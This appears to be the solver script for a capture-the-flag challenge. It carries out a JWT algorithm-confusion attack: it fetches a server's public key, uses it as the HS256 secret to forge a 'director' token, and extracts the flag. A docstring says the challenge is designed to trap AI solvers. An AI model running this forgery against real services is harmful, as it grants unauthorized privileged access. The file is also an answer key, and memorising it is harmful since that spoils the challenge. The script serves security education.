"""
C19 Solver — Wanda's Key

The app uses RS256 to issue tokens but accepts BOTH RS256 and HS256 for verification.
Algorithm confusion attack: sign a token with HS256 using the PUBLIC KEY as the HMAC secret.
The verifier sees HS256, uses the public key as HMAC secret, and accepts it.

AI trap: AI tries alg=none (rejected), then guesses HMAC secrets like "secret"/"avengers".
         Never thinks to use the actual PUBLIC KEY bytes as the HS256 secret.
"""
import jwt, requests

TARGET = "http://<host>:<port>"

# Step 1: Get the public key from /public.key
pub_key = requests.get(TARGET + "/public.key").content

# Step 2: Forge token with role=director, signed with HS256 using public key
forged = jwt.encode(
    {"user": "agent", "role": "director"},
    pub_key,
    algorithm="HS256"
)
print(f"Forged token: {forged[:60]}...")

# Step 3: Submit to /verify
r = requests.post(TARGET + "/verify", data={"token": forged})
import re
m = re.search(r'cyn0x\{[^}]+\}', r.text)
if m: print(f"Flag: {m.group()}")
# Output: cyn0x{jwt_4lg0_c0nfus10n_att4ck}